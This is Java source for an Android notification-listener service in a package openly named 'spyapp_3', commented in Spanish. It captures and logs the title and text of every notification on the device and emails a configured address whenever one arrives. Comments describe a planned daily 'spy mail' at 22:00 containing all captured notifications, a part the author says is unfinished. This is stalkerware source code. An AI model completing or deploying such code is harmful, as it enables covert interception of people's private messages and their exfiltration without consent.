package com.rubik.spyapp_3;

import android.app.Notification;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.widget.Toast;

import com.rubik.spyapp_3.mail.MailConfig;
import com.rubik.spyapp_3.mail.SendMail;

import java.util.Calendar;

public class MyNotificationService  extends NotificationListenerService {

    private static final String TAG = "Rubik MyService";
    private static final int HOUR = 22; //HOUR OF MAIL

    public MyNotificationService() {}

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return super.onBind(intent);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Toast.makeText(this, "My Service Started", Toast.LENGTH_LONG).show();
        Log.d(TAG, " onCreate - Coger las notificaciones y enviar correo");
    }

    public void onDestroy() {
        Toast.makeText(this, "My Service Stopped", Toast.LENGTH_LONG).show();
        Log.d(TAG, "onDestroy");
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "LISTENER CONNECTED");
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // super.onNotificationRemoved(sbn);
        Log.d(TAG, "***** NOTIFICACION ELIMINADA - Paquete --> " + sbn.getPackageName());
    }



    /*
        Aqui faltaria almacenar todas las notificaciones en SQLite o en shared prefences, para despues cuando
        llegue la hora configurada para enviar el correo con todas las guardades en ese dia.

        Como no terminar de funcinar bien las notificaciones y no he podido probarlo bien, esta parte no está terminada.
     */

    //@TargetApi(19)
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
//        super.onNotificationPosted(sbn);

            Log.d(TAG, "***** NOTIFICACION RECIBIDA - Paquete --> " + sbn.getPackageName());
        Notification notification = sbn.getNotification();

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN_MR2) {
                Log.d(TAG, "Api 19 o mayor");
            Bundle bundle = notification.extras;

            String notificationTitle = bundle.getString(Notification.EXTRA_TITLE);
            //Bitmap notificationLargeIcon = ((Bitmap) bundle.getParcelable(Notification.EXTRA_LARGE_ICON));
            CharSequence notificationText = bundle.getCharSequence(Notification.EXTRA_TEXT);
            CharSequence notificationSubText = bundle.getCharSequence(Notification.EXTRA_SUB_TEXT);
            CharSequence notificationTextLines = bundle.getCharSequence("android.textLines");

            Log.d(TAG, "*** Title: " + notificationTitle);
            Log.d(TAG, "*** Text: " + notificationText);
            Log.d(TAG, "*** subText: " + notificationSubText);
            Log.d(TAG, "*** textLines: " + notificationTextLines);

            Log.d(TAG, "Bundle = " + bundle2string(bundle));//bundle2string(bundle)

            // if (isTimeToSendSpyMail()) {
                new SendMail(getApplicationContext(), MailConfig.MAIL_TO, "mail al recibir notificacion", "Bien jugao mail").execute(); //bundle2string(bundle)).execute()
            //}

        } else {
            Log.d(TAG, "Api 18 o menor");
            Log.d(TAG, "Bundle = " + notification.toString());//bundle2string(bundle)

            // if (isInRangeToSpying()) {
                new SendMail(getApplicationContext(), MailConfig.MAIL_TO, "mail al recibir notificacion", "Bien jugao mail").execute(); //bundle2string(bundle)).execute()
            //}
        }


    }

         //Enviar un unico correo a una hora concreta con todas las notidicaciones almacenadas del dia.
    private static boolean isTimeToSendSpyMail () {
        Calendar calendar = Calendar.getInstance();
        // int day = calendar.get(Calendar.DAY_OF_WEEK);
        int hour = calendar.get(Calendar.HOUR_OF_DAY); // 24h

        // if ( (day == Calendar.TUESDAY )  || (day == Calendar.THURSDAY) ) {
        if (hour >= HOUR ) {return true;}
        // }
        return false;

    }

    /**
     *
     * @param bundle La información adjunta en la notificación
     * @return la información contenida en el bundle, concantenada y transformada en Strings
     */
    private static String bundle2string(Bundle bundle) {
        String strdev = null;

        strdev = "Inicio Bundle{";
        for (String key : bundle.keySet()) //foreach
        {
            strdev += " " + key + " => " + bundle.get(key) + ";";
        }
        strdev += " }FIN Bundle";

        return strdev;
    }
}
